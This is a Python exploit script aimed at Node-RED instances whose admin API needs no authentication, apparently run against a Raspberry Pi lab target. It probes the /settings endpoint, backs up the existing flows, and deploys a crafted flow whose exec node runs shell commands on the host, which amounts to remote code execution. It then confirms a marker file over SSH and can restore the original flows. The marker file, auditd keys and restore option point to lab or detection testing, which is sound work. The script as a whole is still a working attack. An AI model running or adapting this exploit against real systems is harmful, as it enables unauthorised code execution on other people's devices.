#Control Version 1.1

import argparse
import json
import subprocess
import sys

ERROR = '\033[91m [!!!]\033[0m'
WARNING = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
CRITICAL = '\033[43m>>>\033[0m'
COLOUR_END = '\033[0m'
UNDERLINE = '\033[4m'

try:
    import requests
except ImportError:
    sys.exit(f"{ERROR} Request unavailable. Try: pip install requests")

targetHost = ""
targetPort = ""
piUser = ""
targetTopic = ""
targetURL = ""

options = ["flows", "settings", "nodes", "context", "subflows", "palette"]

nodeConfirm_File = "/tmp/PWNED_LAB_MARKER.txt"
flowBackup_File = "flows_backup.json"

flowPayload = [
    {
        "id": "nodeTab",
        "type": "tab",
        "label": "Remote Code Execution",
        "disabled": False,
    },
    {
        "id": "nodeInjection",
        "type": "inject",
        "z": "nodeTab",
        "name": "fireOnce_Inject",
        "once": True,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "wires": [["flowDeploy_exec"]]
    },
    {
        "id": "flowDeploy_exec",
        "type": "exec",
        "z": "nodeTab",
        "name": "confirmRCE",
        "command": (
            f"id; hostname; "
            f"echo RCE_CONFIRMED > {nodeConfirm_File}"
        ),
        "addpay": False,
        "append": "",
        "useSpawn": "false",
        "timer": "",
        "winHide": False,
        "oldrc": False,
        "wires": [[], [], []]
    }
]

def promptTarget():
    global targetHost, targetPort, piUser, targetTopic, targetURL

    targetHost = input("Target Host: ")
    targetPort = input("Target Port: ")
    piUser = input("Target Device User: ")

    while True:
        targetTopic = input("Target Topic (Enter '-h' for topic types): ")

        if targetTopic == "-h":
            print("Available options:")
            for option in options:
                print(f"  {option}")
            continue

        if targetTopic in options:
            print(f"Selected option: {targetTopic}")
            break

        print("Invalid option. Enter -h to see available options.")

    targetURL = f"http://{targetHost}:{targetPort}/{targetTopic}"
    print(f"Target URL: {targetURL}")

def authCheck():
    checkURL = f"http://{targetHost}:{targetPort}/settings"
    print(f"{NOTIFICATION} GET {checkURL}")
    print(f"\n{NOTIFICATION} Accessing authorization settings")
    try:
        r = requests.get(checkURL, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"{ERROR} {checkURL} could not be reached.")
        print(f"{WARNING} Try: Check host status")
        sys.exit(1)

    print(f" HTTP {r.status_code}")
    if r.status_code == 200:
        print(f"{NOTIFICATION} {checkURL} returned '200' without credentials")
        print(f"{CRITICAL} NO AUTHENTICATION NEEDED")
        print(f" Body: {r.text[:120]} \n")
        return True
    elif r.status_code == 401:
        print(f"{ERROR} {checkURL} returned '401' without credentials")
        return False
    else:
        print(f"{WARNING} Unexpected status {r.status_code}")

def backupFlows():
    backupURL = f"http://{targetHost}:{targetPort}/flows"
    print(f"{NOTIFICATION} GET {backupURL} -> {flowBackup_File}")

    try:
        r = requests.get(backupURL, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{WARNING} Cannot reach {backupURL} - deploying without a backup")
        return False

    if r.status_code != 200:
        print(f"{WARNING} Backup returned HTTP {r.status_code} - not saved")
        return False

    with open(flowBackup_File, "w") as f:
        f.write(r.text)

    print(f"{NOTIFICATION} Existing flows saved: {flowBackup_File}")
    print(f"{WARNING} Restore with: python3 flowDeploy.py --restore\n")
    return True

def restoreFlows():
    restoreURL = f"http://{targetHost}:{targetPort}/flows"

    try:
        with open(flowBackup_File) as f:
            body = f.read()
    except FileNotFoundError:
        print(f"{ERROR} {flowBackup_File} not found - nothing to restore")
        return False

    print(f"{NOTIFICATION} POST {restoreURL} <- {flowBackup_File}")
    resp = requests.post(restoreURL,
                         headers={"Content-Type": "application/json"},
                         data=body, timeout=10)

    print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")
    if resp.status_code in (200, 204):
        print(f"{NOTIFICATION} Original flows restored")
        return True

    print(f"{WARNING} Restore failed: {resp.text[:200]}")
    return False

def deployTarget_Flow():
    headers = {
        "Content-Type": "application/json",
    }
    body = json.dumps(flowPayload)

    print(f"{NOTIFICATION} POST {targetURL}")
    print(f"Content-Type: application/json")
    print(f"Authorization: disabled")
    print(f"Payload: {len(flowPayload)} nodes")
    print(f"(tab + inject + exec)")
    print(f"Exec command: {flowPayload[2]['command']}\n")

    try:
        resp = requests.post(targetURL, headers=headers, data=body, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{WARNING} Cannot reach {targetURL}")
        print(f"Try: Check Pi state and services")
        sys.exit(1)

    print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")

    if resp.status_code in (200, 204):
        print(f"{NOTIFICATION} Flow deployment effective")
        print(f"{NOTIFICATION} exec node firing")
        print(f"auditd firing -k rce_marker + -k proc_exec")
        return True
    elif resp.status_code == 401:
        print(f"{WARNING} 401 - adminAuth set. Try: 'grep adminAuth ~/.node-red/settings.js'")
        return False
    elif resp.status_code == 400:
        print(f"{WARNING} 400 - retrying")
        resp = requests.post(targetURL, headers=headers,
                             data=json.dumps({"flows": flowPayload}), timeout=10)
        print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")
        if resp.status_code in (200, 204):
            print(f"{NOTIFICATION} Flow deployment effective")
            return True
        print(f"{WARNING} 400 - Bad request.")
        return False
    else:
        print(f"{WARNING} Unknown response {resp.status_code}: {resp.text[:200]}")
        return False

def verifyRCE():
    print(f"\n{NOTIFICATION} Verifying RCE — reading {nodeConfirm_File} on Pi via SSH")
    try:
        result = subprocess.run(
            ["ssh", f"{piUser}@{targetHost}",
             f"cat {nodeConfirm_File} && stat {nodeConfirm_File}"],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0:
            print(f"{NOTIFICATION} Marker file confirmed on Pi:")
            print(result.stdout)
        else:
            print(f"{ERROR} SSH returned rc={result.returncode}")
            print(result.stderr)
    except FileNotFoundError:
        print(f"{ERROR} ssh not found")
    except subprocess.TimeoutExpired:
        print(f"{ERROR} SSH timed out")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--restore", action="store_true")

    args = parser.parse_args()

    if args.dry_run:
        print(f"{NOTIFICATION} Dry-run active - flow payload unsent")
        print(json.dumps(flowPayload, indent=2))
        return

    promptTarget()

    if args.restore:
        restoreFlows()
        return

    if args.check:
        ok = authCheck()
        if not ok:
            sys.exit(1)

    if targetTopic == "flows":
        backupFlows()

    deploy = deployTarget_Flow()

    if deploy and args.verify:
        import time
        print(f"{WARNING} Exec node booting - Wait 5 seconds")
        time.sleep(5)
        verifyRCE()

    if deploy:
        print("\n" + "-" * 60)

if __name__ == "__main__":
    main()